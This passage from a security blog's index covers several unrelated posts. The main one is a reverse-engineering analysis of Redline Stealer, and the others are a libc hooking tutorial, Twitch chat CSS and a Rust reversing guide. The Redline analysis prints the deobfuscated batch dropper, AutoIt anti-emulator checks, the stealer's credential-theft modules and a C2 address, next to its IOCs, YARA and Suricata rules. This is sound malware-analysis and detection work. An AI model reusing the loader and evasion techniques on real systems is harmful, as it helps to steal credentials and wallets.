orig(main_hook, argc, argv, init, fini, rtld_fini, stack_end); } Figure 1: Hooking main function in libc __libc_start_main Next, compile the code with the following command: gcc hook.c -o hook.so -fPIC -shared Finally we can inspect the behavior of argc, argv and envp that are passed using your own progam (Figure 2). #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void print_argv(char **argv){ int count = 0; while (1){ if (argv[count] != NULL){ printf(\"argv[%d] = %s\\n\", count, argv[count]); } else { break; } count++; } } int main(int argc, char **argv){ printf(\"argc: %d\\n\", argc); print_argv(argv); return 0; } Figure 2. Program to Inspect Hooked Values for argc, argv and envp ","date":"2023-02-04","objectID":"/2023/02/hooking-libc.en.md/:2:0","tags":["Hooking","libc","Linux"],"title":"Hooking C Runtime or libc","uri":"/2023/02/hooking-libc.en.md/"},{"categories":["Docs"],"content":"Demo Alright, let me shut all the way up, POC|GTFO right? ","date":"2023-02-04","objectID":"/2023/02/hooking-libc.en.md/:3:0","tags":["Hooking","libc","Linux"],"title":"Hooking C Runtime or libc","uri":"/2023/02/hooking-libc.en.md/"},{"categories":["Docs"],"content":"Conclusion This technique could also be used for analysing malware, where we can introspect APIs and dump their respective arguments during execution to a location of our choice. From an offensive research perspective, this technique can be used to perform fuzzing of applications and how they interact with libc. A feature of Linux that can be used for good and evil. ","date":"2023-02-04","objectID":"/2023/02/hooking-libc.en.md/:4:0","tags":["Hooking","libc","Linux"],"title":"Hooking C Runtime or libc","uri":"/2023/02/hooking-libc.en.md/"},{"categories":["Docs"],"content":"References https://refspecs.linuxfoundation.org/LSB_2.0.1/LSB-Core/LSB-Core/baselib---libc-start-main-.html https://gist.github.com/apsun/1e144bf7639b22ff0097171fa0f8c6b1 ","date":"2023-02-04","objectID":"/2023/02/hooking-libc.en.md/:5:0","tags":["Hooking","libc","Linux"],"title":"Hooking C Runtime or libc","uri":"/2023/02/hooking-libc.en.md/"},{"categories":["Malware"],"content":"Reverse Engineering Redline Stealer that infected Martin Shkreli","date":"2022-11-29","objectID":"/2022/11/redline-stealer/","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Situation Muta from SomeOrdinaryGamers uploaded a video on Redline Stealer on Aug 14, 2022, which infected Martin Shkreli. The purpose of this analysis is to destroy Redline Stealer (specifically the version that infected Martin Shkreli), beginning to end. We will be writing our own configuration extractor, compiling our own version of Redline Stealer in Visual Studio (without source code), write detection signature and tear apart every aspect of the attack chain. The entire live video series of reverse engineering this is available on YouTube for everyone! If you wish to support my work, you can buy me a coffee here. ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:1:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Executive Summary Redline Stealer has the ability to communicate with multiple C2 hosts. Redline Stealer has the ability to present a message box to the user upon execution. Redline Stealer communicates with the C2 server using Simple Object Access Protocol (SOAP). Redline Stealer exits if it detects the infected machine is from a near Russian countries. Redline Stealer executes its modules in random order to potentially evade heuritic detection. PLACEHOLDER (Write single paragraph summary here) ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:2:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Infection Chain The infection chain starts with a download of [BigTitsRoundAsses] 17.12.14 - Jazmyn [1080p].scr from pornleech[.]ch, which creates three files (Table placeholder). Filepath Description %TEMP%\\Che.mp3 AutoIt Interpreter %TEMP%\\Quella.mp3 Batch Script %TEMP%\\Travolge.mp3 AutoIt Loader Script Table placeholder: Written Installer Files ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:3:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Obfuscated BAT Script Once extracted, the installer executes cmd /c cmd \u003c Quella.mp3 \u0026 ping -n 5 localhost, which executes tasklist to identify if PSUAService.exe (PandaAV) is currently running. If the process is not running, it uses autoit.exe as the file name for the AutoIt interpreter. Otherwise, the AutoIt interpreter is named Magenta.exe.pif. Next, the magic bytes MZ is written to the start of the file to contain the AutoIt interpreter. Once written, the file %TEMP%\\Che.mp3 is filtered by findstr to exclude the string a string (Figure placeholder), which results in writing the rest of the AutoIt interperter to the %TEMP% directory as either autoit.exe or Magenta.exe.pif. Next, %TEMP%\\Travolge.mp3 is moved to the file %TEMP%\\i, which is then executed with the AutoIt interpreter (Figure placeholder). Set AUTOIT=Mantenga.exe.pif tasklist /FI \"imagename eq PSUAService.exe\" 2\u003eNUL | find /I /N \"psuaservice.exe\"\u003eNUL if not errorlevel 1 Set AUTOIT=autoit.exe \u003cnul set /p = \"MZ\" \u003e %AUTOIT% findstr /V /R \"^diLJRRSZItYtjhNoXjwrIGvJMByETfIXXTtuIEKyNckyqsZonxjyqPIKKwXfLhuzcquzoGAzCVfhxsJcCXuneCXokxvGGxzAgSJZlF$\" Che.mp3 \u003e\u003e %AUTOIT% Move Travolge.* i %AUTOIT% i ping localhost -n 5 Figure placeholder: Redline Stealer Deobfuscated Batch Script ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:3:1","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Obfuscated AutoIT Script Next, the AutoIT interpreter executes i. Then the AutoIT script performs process hollowing, creates the process jsc.exe in suspended mode, hollows the process then injects the process with Redline Stealer. def decode_string(string: str, key: int) -\u003e str: return ''.join([chr(int(c) - int(key)) for c in string.split('U')]) ; BitDefender Emulator If(Execute(\"EnvGet('COMPUTERNAME')\") = \"tz\") Then Execute(\"WinClose(AutoItWinGetTitle())\") ; Windows Defender Emulator If(FileExists(\"C:\\aaa_TouchMeNot_.txt\")) Then Execute(\"WinClose(AutoItWinGetTitle())\") ; Kaspersky Emulator If(Execute(\"EnvGet('COMPUTERNAME')\") = \"NfZtFbPfH\") Then Execute(\"WinClose(AutoItWinGetTitle())\") ; AVG Emulator If(Execute(\"EnvGet('COMPUTERNAME')\") = \"ELICZ\") Then Execute(\"WinClose(AutoItWinGetTitle())\") Installer → Quella.mp3 (BAT) → Mantenga.exe.pif (Loader) → jsc.exe Looks like they are doing process hollowing from the AutoIT script. CreateProcessW NtWriteVirtualMemory NtReadVirtualMemory NtWriteVirtualMemory NtProtectVirtualMemory NtSetContextThread NtResumeThread NtUnmapViewOfSection ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:3:2","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Redline Stealer Redline Stealer is an information stealing malware available for purchase on underground forums and sells standalone and as a subscription service. This section of the blog is a technical analysis of Redline Stealer and its capabilities. ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:4:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Language Check Once executed, Redline Stealer checks the country of origin against Armenia, Azerbaijan, Belarus, Kazakhstan, Kyrgyzstan, Moldova, Tajikistan, Uzbekistan, Ukraine, and Russia. Next, if TimeZoneInfo.Local.Id contains any of the hard-coded disallowed countries or CultureInfo.CurrentUICulture.EnglishName is null the program calls Environment.Exit. ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:4:1","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"String Decryption To decrypt strings, Redline Stealer calls StrinDecrypt.Read, which base64-decodes the ciphertext, then performs a rotating XOR operation using the key user string (#US) Kenners. import base64 class StringDecrypt(): @staticmethod def Read(ciphertext: str, key: str) -\u003e str: key = key.encode() ciphertext = base64.b64decode(ciphertext) plaintext = [] for i in range(0, len(ciphertext)): plaintext.append(ciphertext[i] ^ key[i % len(key)]) plaintext = bytes(plaintext).decode('utf-8') return base64.b64decode(plaintext).decode('utf-8') Figure 1. Redline Stealer String Decryption Routine in Python ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:4:2","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"User Message If the field Arguments.Message is not an empty or a null string, it is decrypted by calling StringDecrypt.Read (Figure 1) and subsequently presented to the user in a message box. The execution of Redline Stealer is not halted during this process, as the message box is created using a new thread. This functionality in Redline Stealer allows operators to present messages to users, such as fake error messages and more. ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:4:3","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"C2 Communication Redline Stealer uses SOAP messaging protocol to communicate with the C2 server. This section is a technical analysis of how Redline Stealer communicates with its C2 server. Establish Connection To establish a connection with the C2 server, Redline Stealer creates a new class object of ConnectionProvider, which handles all C2 communication. Once created, Redline Stealer decrypts all C2 servers from Arguments.IP with StringDecrypt.Read (Figure 1). Next, Redline Stealer splits the result using the delimiter | to create an array of C2 hosts. Once Redline Stealer has decrypted its array of C2 hosts, Redline Stealer connects to net.tcp://95.217.35[.]153:9678/ using SOAP protocol, the default for Windows Communication Foundation (WCF). Once the WCF ChannelFactory object is created, Redline Stealer sets the field connector as this object. Next, Redline Stealer sets the SOAP header name as Authorization, with the namespace ns1. If unable to connect to the first C2 address, in a loop, Redline Stealer sleeps by calling Thread.Sleep for 5 seconds before attempting the next C2 address in the C2 hosts array. This means Redline Stealer can contain multiple C2 address, increasing the probability one of the C2 address will be operational. Get Settings Redline Stealer creates the data contract class SettingsStruct, which contains data members. These data members are the settings Redline Stealer uses during its execution, which are obtained from the C2 server (Table 1). Type Name Description bool Browsers Enable Stealing Browser Data bool FileSearch Enable File Stealing Module bool Filezilla Enable Filezilla Module bool Wallets Enable Wallet Stealing Module bool GetImageBase Enable Collection of Image Base bool ScanFiles Enable Scanning Files bool VPN Enable Stealing VPN Credentials bool StealSteam Enable Stealing Steam Creds bool Discord Enable Discord Stealing Tokens List\u003cstring\u003e FileSearchPatterns Patterns to Search for Files to Steal List\u003cstring\u003e ChromiumBrowserPaths Paths for Chromium Browsers List\u003cstring\u003e MozillaBrowserPaths Paths for Mozilla Browsers List\u003cWalletFileConfigs\u003e AdditionalWallets Additional Wallets to Steal Table 1. Redline Stealer Settings Data Contract Members Result Data Contract Redline Stealer stores results of data collected from the victim machine in a data contract, which is created with the data member ID. The value of this data member is 100822 originating from Arguments.ID, which is decrypted using StringDecrypt.Read and ID serves as the build ID. Figure placeholder. Redline Stealer Build ID (reference) ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:4:4","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Modules Redline Stealer creates the class EntityResolver, which is created from the template method ItemBase.Extract. If Arguments.Version is not equal to 1, an instance of FullInfoSender is returned, otherwise an instance of PartsSender is returned. In this case, Arguments.Version is set 1, which returns an instance of PartsSender. Next, in a while loop, Redline Stealer executes the Invoker method from the PartsSender instance. Once executed, Redline Stealer initializes the data contract SystemInfo, which will later be populated with data stolen from the infected machine. Next, if the directory %AppData%\\Yandex\\YaAddon does not exist, Redline Stealer creates the directory. Otherwise, if the directory creation time is less than three months old, the directory is deleted and created again. Once completed, Redline Stealer executes modules in the module groups First and Main in random order (Table 2). Module Group Module Name Description First GetUsername Gets Username First GetMonitorProperites Gets Monitor Properties First GetOS Gets OS Name First GetAssemblyLocation Obtains Executing Assembly Location First GetUUID Created a UUID First GetTimezone Gets Timezone Main GetHardwareInfo Get Hardware Information Main GetBrowsers Steal Browser Data Main GetListOfPrograms Get List of Programs Main GetAVs Get List of Security Products Main GetProcesses Get List of Processes Main GetLanguages Get Languages Main GetTelegramProfiles Enumerate Telegram Profiles Main MaybeMozillaStealer Maybe Steal Data From Mozilla Main GetFileSearch Get File Search Results Main StealWallets Steal Crypto Wallets Main StealDiscord Steal Discord Tokens Main GetGameLaunchers Steal Game Launcher Data Main GetVPN Steal VPN Credentials Main GetImageBase Get Executing Assembly Image Base Table 2. Redline Stealer Module Groups The modules in the group First only collect data, which is later sent to the C2 server, whereas the modules in the group Main send data within each module. This could mean the modules in the First group are working on being ported to the Main group. GetAVs (defenders) This module performs the WMI queries provided in Figure 2, against ROOT\\\\SecurityCenter and ROOT\\\\SecurityCenter2. SELECT * FROM AntivirusProduct SELECT * FROM AntiSpyWareProduct SELECT * FROM FirewallProduct Figure 2. Redline Stealer WMI Queries Once completed, the results are appended to a list, which is sent to the C2 server. GetHardwareInfo (hardwares) This module performs the WMI query SELECT * FROM Win32_Processor, collecting the Name and NumberOfCores of the infected endpoint. Additionally, another WMI query is performed on root\\\\CIMV2, with the query SELECT * FROM Win32_VideoController, collecting the AdaperRAM and Name. The results from both of these queries are stored in a template list. Once completed, Redline Stealer appends another structure with the hard-coded key as Total of RAM with the value 4095.46 MB or 4294397952. Next, the data is sent to the C2 server. ListOfPrograms (softwares) This module opens the sub registry key HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall. Next, the sub key names are iterated for their DisplayName and associated DisplayVersion. Once these values are obtained, they are added to a list of strings in the format described in Figure 3. DisplayName0 [DisplayVersion0] DisplayName1 [Displayversion1] DisplayName3 [Displayversion3] ... Figure 3. Redline Stealer Program List Module Structure Next, the results are sent to the C2 server. GetBrowsers If the infected endpoint is 32-bit Redline Stealer opens the registry key SOFTWARE\\\\Clients\\\\StartMenuInternet, otherwise it reads SOFTWARE\\\\WOW6432Node\\\\Clients\\\\StartMenuInternet. Once opened, Redline Stealer iterates the sub key names, collecting the BrowserName and the FileVersion from shell\\\\open\\\\command (default file association). If the FileVersion cannot be obtained, Redline Stealer sets BrowserVersion to Unknown Version. Next, the resulting data contract structure is appende","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:4:5","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Configuration Extraction I have created a configuration extractor, which is available here. mwcfg -m modules/ -i tests/redline/676ae4b1ef05ee0ec754a970cce61a5f8d3093989a58c33087a3a5dca06364aa --pretty | jq [ { \"name\": \"tests/redline/676ae4b1ef05ee0ec754a970cce61a5f8d3093989a58c33087a3a5dca06364aa\", \"type\": \"PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows\", \"mime\": \"application/x-dosexec\", \"md5\": \"396c2688c0469b0cb0d83167d27eca31\", \"sha1\": \"a1f91b8b153d017593119984fbce936c5113a137\", \"sha256\": \"676ae4b1ef05ee0ec754a970cce61a5f8d3093989a58c33087a3a5dca06364aa\", \"configs\": [ { \"hosts\": [ \"95.217.35.153:9678\" ], \"id\": \"100822\", \"family\": \"redline\" } ] } ] Figure placeholder. Redline Stealer Configuration Extraction ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:4:6","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Conclusion At this point, I think we have successfully destroyed Redline Stealer. ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:5:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Video Series ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:6:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Downloads Reverse Engineered Source Code Redline Samples ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:7:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Indicators of Compromise Type Indicator Description SHA256 532c47de5bdd433bea776290d27a741b09a1d5c5f2089e54eced922514a60799 Redline Stealer Installer File SHA256 3e8d604a5d545189c35d810845b3e2208e3c56081507b949ecb17a6bbd4decb1 Messed Up PE File (Che.mp3) SHA256 ac5f7f01c7ca6663810df33bfa62012368b6c17b7520943c094308f30adac766 BAT Script (Quella.mp3) SHA256 454b381e98f092cab4e82f21a790c5ccd4dbd006e44925bcabd6c9289ea6700e AutoIT Script (Travolge.mp3) SHA256 3e26723394ade92f8163b5643960189cb07358b0f96529a477d37176d68aa0a0 AutoIT Interpreter SHA256 454b381e98f092cab4e82f21a790c5ccd4dbd006e44925bcabd6c9289ea6700e AutoIT Script SHA256 676ae4b1ef05ee0ec754a970cce61a5f8d3093989a58c33087a3a5dca06364aa Redline Stealer (Unpacked) IPv4 95.217.35[.]153 Redline Stealer C2 SHA256 2ccf3271c2e61033cddaf0af23854fc73cdaf7eab15745c419f269b8b24687c6 Redline Stealer Deobfuscated ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:8:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Detection This section contains signatures to detect Redline Stealer and its infection chain. ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:9:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"YARA import \"dotnet\" rule redline_0 { meta: author = \"@c3rb3r3u5d3d53c\" description = \"Redline Stealer\" created = \"2023-02-25\" tlp = \"white\" reference = \"https://c3rb3ru5d3d53c.github.io/2023/02/opaque-predicate-hunting-with-yara/\" rev = 1 strings: $string_decrypt_method = { 73 ?? ?? ?? ?? 0a 16 0b 2b ?? 02 07 6F ?? ?? ?? ?? 03 07 03 6F ?? ?? ?? ?? 5d 6F ?? ?? ?? ?? 61 0c 06 72 ?? ?? ?? ?? 08 28 ?? ?? ?? ?? 6F ?? ?? ?? ?? 26 07 17 58 0b 07 02 6F ?? ?? ?? ?? 32 ?? 06 6F ?? ?? ?? ?? 2a } $typedef_0 = \"РrоtoнVРN\" ascii wide $typedef_1 = \"M03illa\" ascii wide condition: uint16(0) == 0x5a4d and dotnet.is_dotnet and $string_decrypt_method and 1 of ($typedef_*) } ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:9:1","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Suricata alert tcp $HOME_NET any -\u003e $EXTERNAL_NET any ( msg:\"MALWARE Redline Stealer C2 Beacon (SOAP-TCP)\"; content:\"|06|\"; depth:1; content:\"/Entity/Id\"; distance:20; fast_pattern; pcre:\"/\\x2fEntity\\x2fId\\d\\x03/\"; content:\"Authorization|08 03|ns1|99 20|\"; distance:0; flow:to_server, established; classtype:trojan-activity; sid:1000000; rev:1; ) alert http $HOME_NET any -\u003e $EXTERNAL_NET any ( msg:\"MALWARE Redline Stealer C2 Beacon (SOAP-HTTP)\"; content:\"SOAPAction|3a 20 22|\"; http_header; content:\"/Endpoint/EnvironmentSettings\"; http_header; distance:0; content:\"\u003cs:Envelope\"; http_client_body; depth:11; flow:to_server, established; classtype:trojan-activity; sid:1000001; rev:1; ) ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:9:2","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Mitre Attack TTPs ID Tactic Technique Description T1059.003 Execution Command and Scripting Interpreter: Windows Command Shell Redline Stealer Remote Tasks from C2 Server T1204.002 Execution User Execution: Malicious File Redline Stealer Remote Tasks from C2 Server T1055.012 Defense Evasion Process Injection: Process Hollowing AutoIt Loader T1027 Defense Evasion Obfuscated Files or Information Batch Loader, AutoIt Loader, Redline Stealer T1071.001 Command and Control Application Layer Protocol: Web Protocols Redline Stealer uses SOAP over TCP or HTTP T1041 Exfiltration Exfiltration Over C2 Channel Redline Stealer Exfiltration with SOAP Protocol over TCP or HTTP T1020 Exfiltration Automated Exfiltration Redline Stealer Modules T1555 Credential Access Credentials from Password Stores Redline Stealer Modules T1528 Credential Access Steal Application Access Token Redline Stealer Modules T1586.001 Resource Development Compromise Accounts: Social Media Accounts Redline Stealer Modules T1036.007 Masquerading Double File Extension AutoIT Interpreter Mantenga.exe.pif T1539 Credential Access Steal Web Session Cookie Redline Stealer Browser Modules New TTP Process Discovery T1057 New TTP System Network Configuration Discovery: Internet Connection Discovery T1016.001 ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:10:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"References AnyRun ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:11:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Malware"],"content":"Contributors dr4k0nia AnFam17 whichbuffer shellsilky grayhatter ","date":"2022-11-29","objectID":"/2022/11/redline-stealer/:12:0","tags":["RedLine","Stealer","Reverse Engineering"],"title":"Destroying Redline Stealer","uri":"/2022/11/redline-stealer/"},{"categories":["Docs"],"content":"Twitch Streaming Live Chat for OBS","date":"2022-11-23","objectID":"/2022/11/twitch-live-chat/","tags":["Twitch","Streaming","LiveChat"],"title":"Twitch Streaming Live Chat for OBS","uri":"/2022/11/twitch-live-chat/"},{"categories":["Docs"],"content":"Twitch Live Stream Chat https://dashboard.twitch.tv/popout/u/\u003cusername\u003e/stream-manager/chat?uuid=2 /* Twitch chat browsersource CSS for OBS Just set the URL as https://www.twitch.tv/%%TWITCHCHANNEL%%/chat?popout=true And paste this entire file into the CSS box Original by twitch.tv/starvingpoet modified by github.com/Bluscream General Settings */ body { color: #FFFFFF!important; margin: 0 auto!important; overflow: hidden!important; text-shadow: -1px -1px 1px #000000, -1px 1px 1px #000000, 1px -1px 1px #000000, 1px 1px 1px #000000!important; } html, body, .room-selector, .room-selector__header, .twilight-minimal-root, .tw-root--theme-light, .popout-chat-page, .chat-room, .tw-c-background-alt, .chat-container, .ember-chat-container { background: rgba(0,0,0,0)!important; background-color: rgba(0,0,0,0.4)!important; } /* Badge Removal To remove additional badge types - moderator, bits, etc - just make a copy of the one of the following badge selectors and replace the word inbetween the quotes with the hover text img.badge[alt=\"Broadcaster\"], img.badge[alt=\"Moderator\"], img.badge[alt=\"Subscriber\"],*/ img.badge[alt=\"Twitch Prime\"], img.badge[alt=\"Turbo\"], img.badge[alt=\"Verified\"] { display: none!important; } /** * Remove the header section */ .ember-chat .chat-room { top: 0!important; } .ember-chat .chat-header, .room-selector__header { display: none!important; } .ember-chat .chat-messages .chat-line.admin { display: none!important; } /** * Remove the footer section */ .ember-chat .chat-room, .chat-input { display: none!important; bottom: -112px!important; } /** * Font Size \u0026 Color */ .ember-chat .chat-messages .chat-line { font-size: 24px!important; line-height: 20px!important; } .chat-container, .ember-chat-container { color: #FFFFFF!important; } /** * Make the chat text white (optional) [thanks to @iggy12345] **/ .chat-line__message { color: #FFFFFF; } /** * https://gist.github.com/Bluscream/83083d0cd483b3563b5e2b4d55519003#gistcomment-3770724 **/ html { font-size: 100% !important; } /** * Small fix to remove the \"Stream Chat\" Header and the Gift/Cheer Leaderboard header * https://gist.github.com/Bluscream/83083d0cd483b3563b5e2b4d55519003#gistcomment-3803252 **/ .stream-chat-header, .channel-leaderboard { display: none !important; } ","date":"2022-11-23","objectID":"/2022/11/twitch-live-chat/:0:0","tags":["Twitch","Streaming","LiveChat"],"title":"Twitch Streaming Live Chat for OBS","uri":"/2022/11/twitch-live-chat/"},{"categories":["Docs"],"content":"A guide to reverse engineering Rust binaries.","date":"2022-08-04","objectID":"/2022/08/malware-reversing-rust/","tags":["Rust","Reversing","Guide"],"title":"A Reverse Engineering Guide for Rust Binaries","uri":"/2022/08/malware-reversing-rust/"},{"categories":["Docs"],"content":"Introduction The Rust programming language is like rust on a vehicle for malware analysts and reverse engineers. The adoption of the language by malware authors spreads like cancer the longer it is in active development. This is due to convenient static linking and support for many operating systems, yielding a binary with little to no dependencies. These features are excellent for the distribution of malware. Every time we need to reverse engineer a Rust binary, we would rather embrace the sweet release of death. We need to take a deeper look into why our current tools are failing to help us perform our jobs effectively. As always with new technologies, it will take some time for our tools to catch up with new compilers. To better understand Rust, let’s have a look at its official definition. Rust is a multi-paradigm, general-purpose programming language. Rust emphasizes performance, type safety, and concurrency. Rust enforces memory safety—that is, that all references point to valid memory—without requiring the use of a garbage collector or reference counting present in other memory-safe languages. To simultaneously enforce memory safety and prevent concurrent data races, Rust’s borrow checker tracks the object lifetime and variable scope of all references in a program during compilation. Rust is popular for systems programming, but also offers high-level features, including functional programming constructs. - Wikipedia Now that you have a basic understanding of what Rust is, we will now break down some common misconceptions. After this, we will discuss the toolset and reverse engineering challenges. ","date":"2022-08-04","objectID":"/2022/08/malware-reversing-rust/:1:0","tags":["Rust","Reversing","Guide"],"title":"A Reverse Engineering Guide for Rust Binaries","uri":"/2022/08/malware-reversing-rust/"},{"categories":["Docs"],"content":"Rust’s Origin Story Rust, like pretty much all modern programming languages these days, was created using LLVM. The very language Rust developers hate, C or C++ is used to create Rust. Let that shit sink into your heads for a minute. Compilers are not magic, they are usually created from lower level programming languages. Without an egg, how do you get chickens or your American breakfast in the morning, It must originate from somewhere. If you need entertainment, tell a Rust fanboy or fangirl that Rust came from C++ and LLVM. Then watch them question everything they thought they knew. 😆 ","date":"2022-08-04","objectID":"/2022/08/malware-reversing-rust/:2:0","tags":["Rust","Reversing","Guide"],"title":"A Reverse Engineering Guide for Rust Binaries","uri":"/2022/08/malware-reversing-rust/"},{"categories":["Docs"],"content":"Memory Don’t be fooled, although it has been stated that Rust does not have a garbage collector, this is based on a definition technicality. Yes, we are talking about semantics at this point, in my opinion. 😅 Rust does more memory garbage collection calculation during compile time, instead of during runtime. Although Rust fanatics think the language is a safe haven with no vulnerabilities, you can still perform unsafe memory operations in Rust as well by using the unsafe keyword. In the unsafe block you can dereference raw pointers, implement unsafe traits, access or modify a mutable static variable, call unsafe functions or methods. extern crate libc; use std::mem; fn main() { unsafe { let my_num: *mut i32 = libc::malloc(mem::size_of::\u003ci32\u003e() as libc::size_t) as *mut i32; libc::free(my_num as *mut libc::c_void); } } It is important to note that although unsafe is used, the rustc compiler will still insert some memory safety features. This makes rustc a very powerful compiler where the developer can completely bypass safety to do lower level operations just like in C, Assembly or C++. Rust provides “memory safe” options much like in C++, when you use std::string the compiler will deallocate the object once it is no longer referenced. As with any technology, the language is not completely “memory safe” as they may advertise. With any application there can be vulnerabilities, humans did write the Rust programming language, developers can still insert unsafe code, and we are not infallible creatures. We now learned that Rust developers can introduce unsafe memory operations into their applications. Also, we now know that garbage collection still happens but more so, it’s added to the program during compile time rather than handled during runtime. Again, if you have a “memory safe” language, the cleanup of memory must be handled for you somehow, that garbage has to go somewhere, it just does not disappear into the void magically. ","date":"2022-08-04","objectID":"/2022/08/malware-reversing-rust/:3:0","tags":["Rust","Reversing","Guide"],"title":"A Reverse Engineering Guide for Rust Binaries","uri":"/2022/08/malware-reversing-rust/"},{"categories":["Docs"],"content":"Rust Toolset In order to understand how to reverse engineer Rust binaries, we should have a basic understanding of the toolset provided to developers. ","date":"2022-08-04","objectID":"/2022/08/malware-reversing-rust/:4:0","tags":["Rust","Reversing","Guide"],"title":"A Reverse Engineering Guide for Rust Binaries","uri":"/2022/08/malware-reversing-rust/"},{"categories":["Docs"],"content":"rustc The compiler rustc is used to compile Rust code. Most developers do not invoke rustc directly, but instead use cargo. cargo build --verbose ","date":"2022-08-04","objectID":"/2022/08/malware-reversing-rust/:4:1","tags":["Rust","Reversing","Guide"],"title":"A Reverse Engineering Guide for Rust Binaries","uri":"/2022/08/malware-reversing-rust/"},{"categories":["Docs"],"content":"cargo Cargo is a Rust package manager, it will download package dependencies, compiles packages, distributes packages by uploading them to crates.io. Think of it like pip for Python. ","date":"2022-08-04","objectID":"/2022/08/malware-reversing-rust/:4:2","tags":["Rust","Reversing","Guide"],"title":"A Reverse Engineering Guide for Rust Binaries","uri":"/2022/08/malware-reversing-rust/"},{"categories":["Docs"],"content":"Reverse Engineering Challenges This section will cover challenges we face with our existing tooling when reverse engineering Rust binaries. ","date":"2022-08-04","objectID":"/2022/08/malware-reversing-rust/:5:0","tags":["Rust","Reversing","Guide"],"title":"A Reverse Engineering Guide for Rust Binaries","uri":"/2022/08/malware-reversing-rust/"},{"categories":["Docs"],"content":"Strings without NULL Termination Rust will store strings differently than most compilers, it will store them without NULL termination between strings, then reference the very long strings with a table. Rust will store strings differently than most compilers, it will store them as multiple strings all together without NULL terminators between them. The address of these very long strings will be referenced by pointer and size in a table. We can emulate how Rust prints strings by using the format strings with %.*s and how it avoids using NULL terminators in the following code. #include \u003cstdio.h\u003e #define STRING_SIZE 27 #define STRING_SIZE_0 13 #define STRING_SIZE_1 13 typedef struct _RUST_STRINGS { char *ascii; unsigned int size; } RUST_STRINGS, *PRUST_STRINGS; int main(int argc, char **argv){ char g_strings[STRING_SIZE] = \"Hello World!\\nHello There!\\n\\0\"; RUST_STRINGS rstrings[2] = { {(char *)*\u0026g_strings, STRING_SIZE_0}, {(char *)\u0026g_strings+STRING_SIZE_0, STRING_SIZE_1}}; printf(\"%.*s\", rstrings[0].size, rstrings[0].ascii); printf(\"%.*s\", rstrings[1].size, rstrings[1].ascii); return 0; } While this may seem 